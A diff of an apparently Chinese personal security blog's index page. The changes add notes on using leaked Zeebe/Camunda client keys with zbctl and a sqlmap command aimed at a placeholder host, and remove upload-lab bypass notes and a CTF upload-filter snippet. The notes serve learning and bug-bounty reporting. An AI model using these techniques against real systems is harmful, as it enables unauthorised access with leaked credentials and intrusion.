@@ -200,6 +200,267 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/12/zeebe%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/12/zeebe%E5%AF%86%E9%92%A5%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="post-title-link" itemprop="url">zeebe密钥信息泄露</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-12 20:58:00" itemprop="dateCreated datePublished" datetime="2022-04-12T20:58:00+08:00">2022-04-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-16 23:30:10" itemprop="dateModified" datetime="2022-07-16T23:30:10+08:00">2022-07-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url" rel="index"><span itemprop="name">1.信息收集</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/1-github%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" itemprop="url" rel="index"><span itemprop="name">1.github信息泄露</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>zeebe会生成一个密钥，密钥可以导出成一个名为CamundaCloudMgmtAPI-Client-test.txt文本文档。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export ZEEBE_ADDRESS=&#x27;bbbbbbbb-947b-bbbb-b7b7-bbbbbbbb2e77.bru-2.zeebe.camunda.io:443&#x27;</span><br><span class="line">export ZEEBE_CLIENT_ID=&#x27;bbbbbbDTbbbbbbbbbb-.wfbbbbbbbbbb&#x27;</span><br><span class="line">export ZEEBE_CLIENT_SECRET=&#x27;ZxRh9BE4EPY521Pbbbbbbbbbbbbbbbbbbbbbbbbbb~w4if2u~OAbbbbbbbbbb~AR&#x27;</span><br><span class="line">export ZEEBE_AUTHORIZATION_SERVER_URL=&#x27;https://login.cloud.camunda.io/oauth/token&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>通过zbctl命令可以使用该密钥控制zeebe，具体流程为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm i -g zbctl	//安装npm环境</span><br><span class="line">source CamundaCloudMgmtAPI-Client-test.txt	//导入密钥</span><br><span class="line">zbctl status	//查看zeebe状态</span><br></pre></td></tr></table></figure>
+
+<p>如果成功，则会返回类似如下信息</p>
+<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220412212935249.png" alt="image-20220412212935249"></p>
+<p>可以利用密钥明显的关键字，使用GSIL监控github，抓取zeebe密钥泄露情况，提交到对应src.</p>
+<p>参考资料（zeebe文档）：<a target="_blank" rel="noopener" href="https://docs.camunda.io/docs/guides/getting-started/connect-to-your-cluster/">https://docs.camunda.io/docs/guides/getting-started/connect-to-your-cluster/</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/07/openpyxl%E6%A8%A1%E5%9D%97-excel%E8%87%AA%E5%8A%A8%E5%8C%96%E5%A4%84%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/07/openpyxl%E6%A8%A1%E5%9D%97-excel%E8%87%AA%E5%8A%A8%E5%8C%96%E5%A4%84%E7%90%86/" class="post-title-link" itemprop="url">openpyxl模块-excel自动化处理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-07 13:07:01" itemprop="dateCreated datePublished" datetime="2022-04-07T13:07:01+08:00">2022-04-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E8%87%AA%E5%8A%A8%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">1.自动化</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E8%87%AA%E5%8A%A8%E5%8C%96/1-%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">1.文件处理</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>参考资料：<a target="_blank" rel="noopener" href="https://www.osgeo.cn/openpyxl/index.html">https://www.osgeo.cn/openpyxl/index.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install openpyxl	//安装</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import openpyxl	//导入</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wb=openpyxl.load_workbook(&#x27;test.xlsx&#x27;)	//导入xlsx文件</span><br><span class="line">sheet1=wb[&#x27;表名&#x27;]	//指定表</span><br><span class="line">sheet1=wb.active	//指定表为当前活动表格</span><br><span class="line">sheet1.max_row	//表格最大行数</span><br><span class="line">sheet1.cell(row=row_num,column=column_num).value	//取单元格值，行和列都从1开始</span><br><span class="line">wb.save(&#x27;test.xlsx&#x27;)	//保存</span><br><span class="line">wb.close()	//关闭文件</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/18/sqlmap%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/18/sqlmap%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">sqlmap使用总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-18 18:05:14" itemprop="dateCreated datePublished" datetime="2022-02-18T18:05:14+08:00">2022-02-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">1.工具总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/1-web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">1.web安全工具</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="基础sqlmap指令："><a href="#基础sqlmap指令：" class="headerlink" title="基础sqlmap指令："></a>基础sqlmap指令：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u https://www.evil.com?id=1 --level 3 --risk 3 -p id</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h3><p>–timeout&#x3D;	设置http在几秒后超时</p>
+<p>–ignore-timeouts	忽略http超时</p>
+<p>–output-dir&#x3D;目录	设置sqlmap结果的输出路径</p>
+<p>c:\users\用户名\AppData\Local\sqlmap\output\	删除sqlite即清除缓存重新扫描</p>
+<p>–test-filter&#x3D;mypayload1	指定使用某payload</p>
+<p>–test-skip&#x3D;mypayload1	跳过某payload</p>
+<p>–force-ssl	告诉sqlmap测试的链接是https协议</p>
+<p>–technique&#x3D;TECH  SQL注入技术测试（默认BEUST）</p>
+<p>–start：指定开始的行（跑指定行数据）</p>
+<p>–stop：指定结束的行</p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/18/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -803,317 +1064,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/22/uploadlab%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/22/uploadlab%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">uploadlab闯关笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-01-22 09:40:50" itemprop="dateCreated datePublished" datetime="2022-01-22T09:40:50+08:00">2022-01-22</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">1.靶场</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E9%9D%B6%E5%9C%BA/1-uploadlabs/" itemprop="url" rel="index"><span itemprop="name">1.uploadlabs</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="Pass-01-JS校验"><a href="#Pass-01-JS校验" class="headerlink" title="Pass-01 JS校验"></a>Pass-01 JS校验</h4><h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><p>burpsuite绕过，先传一个jpg，再通过burpsuite拦截包并修改后缀为php：</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220122095806675.png" alt="image-20220122095806675"></p>
-<h5 id="解题2"><a href="#解题2" class="headerlink" title="解题2"></a>解题2</h5><p>通过浏览器开发者工具修改源js代码，将js代码校验块return chekfile()改成return true，使校验失效：</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220122100103123.png" alt="image-20220122100103123"></p>
-<h4 id="Pass-02-MIME校验"><a href="#Pass-02-MIME校验" class="headerlink" title="Pass-02 MIME校验"></a>Pass-02 MIME校验</h4><h5 id="解题1-1"><a href="#解题1-1" class="headerlink" title="解题1"></a>解题1</h5><p>修改Content-Type类型为允许类型即可，这里改为image&#x2F;jpg，代表图片</p>
-<p>常见Content-Type类型有：</p>
-<p>text&#x2F;plain 　　　　　　　 　文本类型<br> text&#x2F;css  　　　　　　　 　 css类型<br> text&#x2F;html 　　 　　　　　 　html类型<br> application&#x2F;x-javascript 　  　js类型<br> application&#x2F;json　　　　　   json类型<br> image&#x2F;png jpeg gif　　　　 　 image&#x2F;*</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220122100501522.png" alt="image-20220122100501522"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/01/22/uploadlab%E9%97%AF%E5%85%B3%E7%AC%94%E8%AE%B0/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/18/Docker%E5%9F%BA%E7%A1%80/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/18/Docker%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">Docker基础</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-18 16:47:52" itemprop="dateCreated datePublished" datetime="2021-11-18T16:47:52+08:00">2021-11-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-28 10:05:05" itemprop="dateModified" datetime="2022-07-28T10:05:05+08:00">2022-07-28</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/" itemprop="url" rel="index"><span itemprop="name">1.环境部署</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/1-%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">1.其他</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><p>脚本安装与手动安装</p>
-<p>Docker教程：<a target="_blank" rel="noopener" href="https://www.runoob.com/docker/docker-tutorial.html">https://www.runoob.com/docker/docker-tutorial.html</a></p>
-<h3 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h3><p>docker	帮助</p>
-<p>docker stats –help	单个参数（stats）的具体使用方法</p>
-<p>docker pull ubuntu	下载镜像</p>
-<p>docker run -it ubuntu &#x2F;bin&#x2F;bash	以交互方式运行docker（-i：交互式，-t：终端，ubuntu：镜像，&#x2F;bin&#x2F;bash：执行的命令）</p>
-<p>docker ps	查看正在运行的容器</p>
-<p>docker ps -a	查看所有存在的容器</p>
-<p>docker start name&#x2F;id	根据名字或id启动一个已停止的容器</p>
-<p>docker run -itd ……	-d：后台运行</p>
-<p>docker stop name&#x2F;id	停止一个容器</p>
-<p>docker restart name&#x2F;id	重启容器</p>
-<p>docker attach name&#x2F;id	进入在后台运行的容器（用该命令进入容器exit后会导致容器停止）</p>
-<p>docker exec -it name&#x2F;id &#x2F;bin&#x2F;bash	进入在后台运行的容器（用该命令进入容器exit后只会退出，而不会停止容器）</p>
-<p>docker export name&#x2F;id &gt; ubuntu.tar	导出容器</p>
-<p>cat docker&#x2F;ubuntu.tar | docker import - test&#x2F;ubuntu:v1	从容器快照导入容器</p>
-<p>docker import <a href="http://example.com/exampleimage.tgz">http://example.com/exampleimage.tgz</a> example&#x2F;imagerepo	从URL或目录导入容器</p>
-<p>docker rm -f name&#x2F;id	强制删除容器</p>
-<p>docker container prune	清理所有处于终止状态的容器</p>
-<p>docker rename oldname newname	重命名容器</p>
-<p>docker cp &#x2F;路径&#x2F;文件名 容器ID:&#x2F;上传路径	传文件到docker</p>
-<p>docker cp 容器ID:&#x2F;上传路径 &#x2F;路径&#x2F;文件名 	从docker传文件到本地</p>
-<h3 id="使用Docker创建一个WEB"><a href="#使用Docker创建一个WEB" class="headerlink" title="使用Docker创建一个WEB"></a>使用Docker创建一个WEB</h3><p>docker run -d -p 8081:5000 –name webapp-test1 training&#x2F;webapp python app.py	使用创建一个webapp并从容器内部的5000端口映射到主机的8081端口（-P不带参数可以随机映射端口）</p>
-<p>docker port name&#x2F;id	查看容器映射的端口信息</p>
-<p>docker logs -f name&#x2F;id	查看容器运行日志（-f标准输出，类似于tail -f）</p>
-<p>docker top name&#x2F;id	查看容器内部运行的进程</p>
-<p>docker inspect name&#x2F;id	检查容器底层信息，记录着容器的配置和状态，json格式</p>
-<p>docker ps -l	查看最后一次创建的容器</p>
-<h3 id="Docker镜像"><a href="#Docker镜像" class="headerlink" title="Docker镜像"></a>Docker镜像</h3><p>docker images	列出本机所有镜像</p>
-<p>docker search	在网络上搜索镜像</p>
-<p>docker rmi	删除镜像</p>
-<p>docker commit -m&#x3D;”has update” -a&#x3D;”runoob” name&#x2F;id runoob&#x2F;ubuntu:v2	容器快照，将现有容器状态存为新的镜像（-m：提交的描述信息，-a：指定镜像作者，runoob&#x2F;ubuntu:v2镜像名）</p>
-<p>docker tag name&#x2F;id xiaoluan&#x2F;ubuntu:target	为镜像添加一个新的标签，一个镜像可以指定多个标签</p>
-<h3 id="使用Docker创建一个MSSQL数据库"><a href="#使用Docker创建一个MSSQL数据库" class="headerlink" title="使用Docker创建一个MSSQL数据库"></a>使用Docker创建一个MSSQL数据库</h3><p>docker pull mcr.microsoft.com&#x2F;mssql&#x2F;server:2017-latest	下载镜像</p>
-<p>参考资料：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/b1d9194900a2?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">https://www.jianshu.com/p/b1d9194900a2?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></p>
-<p>docker run -e “ACCEPT_EULA&#x3D;Y” -e “SA_PASSWORD&#x3D;&lt;YourPassword!&gt;” -p 8001:1433 –name mssql1 -d mcr.microsoft.com&#x2F;mssql&#x2F;server:2017-latest	运行mssql的docker容器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-e &#x27;ACCEPT_EULA=Y&#x27; ：	将 ACCEPT_EULA 变量设置为任意值，以确认接受最终用户许可协议。 SQL Server 映像的必需设置。</span><br><span class="line"></span><br><span class="line">-e &#x27;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&#x27; ：	指定至少包含 8 个字符且符合 SQL Server 密码要求的强密码。 SQL Server 映像的必需设置。</span><br></pre></td></tr></table></figure>
-
-<p>docker exec -it mssql1 &#x2F;opt&#x2F;mssql-tools&#x2F;bin&#x2F;sqlcmd -S localhost -U SA -P “&lt;YourPassword!&gt;” -Q ‘ALTER LOGIN SA WITH PASSWORD&#x3D;”&lt;YourPassword!&gt;”‘	更改旧的SQL SERVER的SA密码</p>
-<p>docker exec -it mssql1 “bash”	与mssql容器交互</p>
-<p>&#x2F;opt&#x2F;mssql-tools&#x2F;bin&#x2F;sqlcmd -S localhost -U SA -P “&lt;YourNewStrong!Passw0rd&gt;”	调用sqlcmd登入mssql</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">文件上传</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-10-29 14:41:11" itemprop="dateCreated datePublished" datetime="2021-10-29T14:41:11+08:00">2021-10-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:37" itemprop="dateModified" datetime="2022-07-16T22:52:37+08:00">2022-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-CTF/" itemprop="url" rel="index"><span itemprop="name">1.CTF</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-CTF/1-%E6%97%A5%E5%B8%B8%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">1.日常练习</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="题型（文件上传，代码审计）"><a href="#题型（文件上传，代码审计）" class="headerlink" title="题型（文件上传，代码审计）"></a>题型（文件上传，代码审计）</h4><h5 id="链接1"><a href="#链接1" class="headerlink" title="链接1"></a>链接1</h5><p><a target="_blank" rel="noopener" href="https://ctf.show/challenges">https://ctf.show/challenges</a> –&gt; web13</p>
-<h5 id="解题1"><a href="#解题1" class="headerlink" title="解题1"></a>解题1</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	<span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    